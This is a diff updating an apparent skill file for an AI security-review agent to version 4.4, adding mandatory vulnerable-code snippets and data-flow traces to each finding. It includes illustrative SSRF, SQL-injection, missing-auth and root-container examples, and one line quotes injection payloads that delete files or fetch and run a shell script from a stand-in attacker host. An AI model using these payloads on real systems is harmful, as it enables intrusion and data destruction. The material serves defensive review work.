@@ -8,7 +8,7 @@ description: >-
 
 # AI Security Reviewer
 
-**Version 4.3** — Full Vulnerability Taxonomy | Agent-Only Execution | Mandatory Remediation | curl DAST Fallback | 109-Check + Appendix H
+**Version 4.4** — Vulnerable Code + Data Flow per Finding | Full Taxonomy | Agent-Only | Mandatory Remediation | curl DAST | 109-Check + Appendix H
 
 ## Execution model (read first)
 
@@ -53,7 +53,8 @@ Your analysis stack (**you run each step** — manifests are cookbooks, not scri
 11. **`references/report-coverage-matrix.md`** — all **109** Appendix E rows you must complete
 12. **`graphify path "<source>" "<sink>"`** — mandatory for injection, CVE, SSRF reachability
 13. **AI validation checklist + pre-report gates (G1–G5)** — true positives only
-14. **`references/report-finding-completeness.md`** — every finding must have **`### Remediation`** (BEFORE/AFTER for code)
+14. **`references/report-finding-completeness.md`** — every finding: **`### Vulnerable Code Snippet`**, **`### Data Flow Trace`**, **`### Remediation`** (BEFORE/AFTER for code)
+15. **`references/report-vulnerable-code-dataflow.md`** — snippet + trace templates and completion gate
 
 **Burp MCP host rule (mandatory):**
 1. Discover hosts with `rg` per **`references/burp-host-discovery.md`** (do **not** run `discover_burp_hosts.sh`)
@@ -108,16 +109,17 @@ Enterprise security reviewer — **agent-native analysis** with Checkmarx-qualit
 3. **Static Analysis** — 750+ pattern signatures across 85+ vulnerability classes
 4. **AI Validation** — LLM-powered true positive verification
 5. **Natural Language Descriptions** — Checkmarx-style vulnerability explanations
-6. **Full Stack Traces** — Complete data flow from source to sink
-7. **Detailed Remediation** — Code fixes with before/after examples
-8. **Burp Suite PoC Requests** — Copy-paste HTTP requests for Repeater/Intruder per finding
-9. **Burp MCP Live Verification** — `send_http1_request` confirms missing auth when MCP available
-10. **HTML Report Export** — Styled HTML report generated at end of every review
-11. **PDF Export** — Optional PDF from markdown (legacy)
-12. **Full Check Coverage Matrix** — Appendix E lists all **109** checks; Appendix F phase log; Appendix G architecture assessment
-13. **Exploitable CVE Analysis** — Dependency CVEs reported only with import + path reachability proof
-14. **IaC Misconfiguration Detection** — Docker, Kubernetes, Terraform, Nginx, CI/CD security review
-15. **Security Architect Lens** — Attack surface, trust boundaries, STRIDE, control maturity
+6. **Vulnerable Code Snippets** — Real source + sink code copied from repo per finding
+7. **Full Stack Traces** — Complete data flow from source to sink (mandatory `### Data Flow Trace`)
+8. **Detailed Remediation** — Code fixes with before/after examples
+9. **Burp Suite PoC Requests** — Copy-paste HTTP requests for Repeater/Intruder per finding
+10. **Burp MCP Live Verification** — `send_http1_request` confirms missing auth when MCP available
+11. **HTML Report Export** — Styled HTML report generated at end of every review
+12. **PDF Export** — Optional PDF from markdown (legacy)
+13. **Full Check Coverage Matrix** — Appendix E lists all **109** checks; Appendix F phase log; Appendix G architecture assessment
+14. **Exploitable CVE Analysis** — Dependency CVEs reported only with import + path reachability proof
+15. **IaC Misconfiguration Detection** — Docker, Kubernetes, Terraform, Nginx, CI/CD security review
+16. **Security Architect Lens** — Attack surface, trust boundaries, STRIDE, control maturity
 
 ---
 
@@ -187,7 +189,7 @@ Always pass `--budget N` on `query` (1200–2000 per query). Batch related quest
 8. graphify path             → per candidate: source → sink (reachability)
 9. Read + AI validate        → Phase 3 checklist + pre-report gates G1–G5
 10. Burp PoC                 → TRUE POSITIVE + AUTH (code-derived host)
-11. security_report.md       → Appendix D + E + F + G + H; **every finding has ### Remediation**
+11. security_report.md       → Appendix D + E + F + G + H; **every finding: Vulnerable Code + Data Flow + Remediation**
 12. HTML (mandatory)         → generate_html_report.py → security_report.html
 ```
 
@@ -264,6 +266,42 @@ escaping, enabling an attacker to inject arbitrary shell commands by crafting a
 malicious filename such as "; rm -rf / #" or "$(curl attacker.com/shell.sh|bash)", 
 leading to complete server compromise.
 ```
+
+---
+
+## Vulnerable Code Snippet Format (MANDATORY)
+
+Every finding MUST include **`### Vulnerable Code Snippet`** with **real code** from the repository (after `Read` at reported lines). Place it **after** `### Description` and **before** `### Data Flow Trace`.
+
+**Rules:**
+- Include **source** and **sink** lines in one or two fenced blocks
+- Add `// SOURCE` and `// SINK` comments; include `file:line` in block header comment
+- Do not paraphrase — copy verbatim from the codebase
+- Elide only unrelated middle lines with `// ...`
+
+```markdown
+### Vulnerable Code Snippet
+
+```javascript
+// routes/catalog-proxy.js — lines 45–52
+router.get('/fetchResource', function (req, res) {
+  var url = req.query.url;                         // SOURCE: HTTP query param
+  request(url, function (err, response, body) {  // SINK: outbound SSRF
+    res.send(body);
+  });
+});
+```
+```
+
+**By finding type:**
+| Type | Snippet content |
+|------|-----------------|
+| VULN | User input source + dangerous sink |
+| AUTH | Route registration without auth middleware |
+| CVE | `require('pkg')` + vulnerable API call |
+| IAC | Misconfigured resource stanza |
+
+Full templates: **`references/report-vulnerable-code-dataflow.md`**
 
 ---
 
@@ -368,13 +406,23 @@ line 142 in the getUser endpoint. This untrusted data flows through the `validat
 method (line 145) which only checks for null values but does not sanitize SQL metacharacters 
 like single quotes, semicolons, or comment sequences.
 
-The tainted data is then concatenated directly into the SQL query string:
-\`\`\`java
-String query = "SELECT * FROM users WHERE id = '" + validatedId + "'";
-\`\`\`
-
-This query is executed via `statement.executeQuery(query)` at line 150 without 
+The query is executed via `statement.executeQuery(query)` at line 150 without 
 parameterization, enabling an attacker to inject arbitrary SQL commands.
+
+### Vulnerable Code Snippet
+
+```java
+// UserController.java — lines 142–150
+public User getUser(HttpServletRequest request) {
+    String userId = request.getParameter("id");              // SOURCE
+    String validatedId = validateInput(userId);              // STEP: null check only
+    
+    String query = "SELECT * FROM users WHERE id = '" + validatedId + "'";  // string concat
+    Statement stmt = connection.createStatement();
+    ResultSet rs = stmt.executeQuery(query);                 // SINK
+    // ...
+}
+```
 
 ### Data Flow Trace
 
@@ -601,10 +649,29 @@ valid SSO session [unless gateway/WAF blocks unauthenticated traffic — see Liv
 
 ### Route Handler Chain (code)
 
-\`\`\`javascript
+See **Vulnerable Code Snippet** below — route registered without auth middleware.
+
+### Vulnerable Code Snippet
+
+```javascript
+// src/routes/api/index.js — line 520
 router.get('/order/details', Validator..., Preparer..., Handler..., Responder.respond);
-// No verifySsoToken in chain
-\`\`\`
+// Missing: verifySsoToken / AuthHandler.verifySsoToken in chain
+```
+
+### Data Flow Trace
+
+| Step | Location | Analysis |
+|------|----------|----------|
+| SOURCE | HTTP GET /order/details | Unauthenticated client |
+| STEP 1 | routes/api/index.js:520 | No SSO middleware in chain |
+| SINK | Handler → business logic | Order/PII returned |
+
+### Simplified Flow
+
+```
+GET /order/details (no Cookie) → route without verifySsoToken → handler executes
+```
 
 ### Live Verification (Burp MCP)
 
@@ -680,6 +747,23 @@ Use when a **published CVE** (Critical/High) is **reachable and exploitable** in
 ### Exploit Scenario
 [How attacker triggers vulnerable code — 2-4 sentences]
 
+### Vulnerable Code Snippet
+
+```javascript
+// routes/foo.js:12 + api/bar.js:89
+const pkg = require('vulnerable-package');   // lockfile version X.Y.Z
+// ...
+pkg.vulnerableMethod(userInput);             // SINK per CVE advisory
+```
+
+### Data Flow Trace
+
+| Step | Location | Evidence |
+|------|----------|----------|
+| SOURCE | GET /api/baz | User-controlled input |
+| STEP 1 | routes/foo.js:12 | `require('vulnerable-package')` |
+| SINK | api/bar.js:89 | Vulnerable API invoked |
+
 ### Remediation
 1. Upgrade to `package@fixed_version`
 2. `npm ci` / regenerate lockfile
@@ -713,6 +797,20 @@ Use when a **published CVE** (Critical/High) is **reachable and exploitable** in
 ### Description
 The [resource] at line **N** of **[file]** [misconfiguration detail]. In production this 
 [impact: root container, open SG, missing HSTS, etc.].
+
+### Vulnerable Code Snippet
+
+```yaml
+# Dockerfile — line 12
+USER root          # SINK: container runs as root
+```
+
+### Data Flow Trace
+
+| Step | Location | Analysis |
+|------|----------|----------|
+| SOURCE | Container start | Process runs as configured user |
+| SINK | Dockerfile:12 | `USER root` — full host compromise on breakout |
 
 ### Blast Radius (ARCH-07)
 [Can attacker reach secrets, cluster admin, or customer data from this misconfig?]
@@ -900,7 +998,7 @@ Finding ID series: **VULN-NNN**, **AUTH-NNN**, **CVE-NNN**, **IAC-NNN**.
 
 **Completion gate:** Appendix E counts match Executive Summary. Appendix F logs what **you** ran (`rg`, `graphify`, `npm audit`, Burp MCP, **curl**).
 
-**Finding completeness gate (mandatory):** Follow **`references/report-finding-completeness.md`**. Count of `## [SEVERITY]` finding headers in Detailed Findings **must equal** count of `### Remediation` sections. Every code finding needs **BEFORE/AFTER** snippets under Remediation. Do not hand off if any finding lacks `### Remediation` — abbreviated table-only entries break HTML export.
+**Finding completeness gate (mandatory):** Follow **`references/report-finding-completeness.md`** and **`references/report-vulnerable-code-dataflow.md`**. Count of `## [SEVERITY]` finding headers **must equal** counts of `### Vulnerable Code Snippet`, `### Data Flow Trace`, and `### Remediation`. Every code finding needs real snippet + trace + BEFORE/AFTER under Remediation. Do not hand off if any finding lacks these sections.
 
 If remediation changed source files: `graphify update .`
 
@@ -1174,12 +1272,21 @@ See `references/security-architect.md` for full template.
 
 ---
 
-**Generated by AI Security Reviewer v4.3**
+**Generated by AI Security Reviewer v4.4**
 **HTML Export:** `python scripts/generate_html_report.py security_report.md -o security_report.html`
 **PDF Export (optional):** `python generate_pdf.py security_report.md`
 ```
 
 ---
+
+## Key Enhancements (v4.4)
+
+| Feature | Description |
+|---------|-------------|
+| **Mandatory vulnerable code snippet** | `### Vulnerable Code Snippet` — real source + sink from repo per finding |
+| **Mandatory data flow trace** | `### Data Flow Trace` — full ASCII box or step table + simplified flow; not optional |
+| **HTML panels** | Generator renders dedicated Vulnerable Code + Data Flow panels |
+| **`report-vulnerable-code-dataflow.md`** | Templates and grep completion gate (findings = snippets = traces = remediations) |
 
 ## Key Enhancements (v4.3)
 
@@ -1414,7 +1521,8 @@ that expands to petabytes of data, exhausting disk space and memory.
 
 | File | Contents |
 |------|----------|
-| **`references/report-finding-completeness.md`** | **Mandatory ### Remediation** per finding; BEFORE/AFTER; pre-HTML gate |
+| **`references/report-finding-completeness.md`** | **Mandatory snippet + trace + Remediation** per finding; BEFORE/AFTER for code |
+| **`references/report-vulnerable-code-dataflow.md`** | **Vulnerable code + data flow templates** and completion gate |
 | **`references/skill-privacy.md`** | **No user/org data in skill** — hygiene checklist before sharing |
 | **`references/curl-dast-fallback.md`** | **curl live verify** when Burp MCP unavailable |
 | **`references/manual-code-review.md`** | **Senior AppSec manual review** — context, taint, OWASP taxonomy, gates G1–G5 |
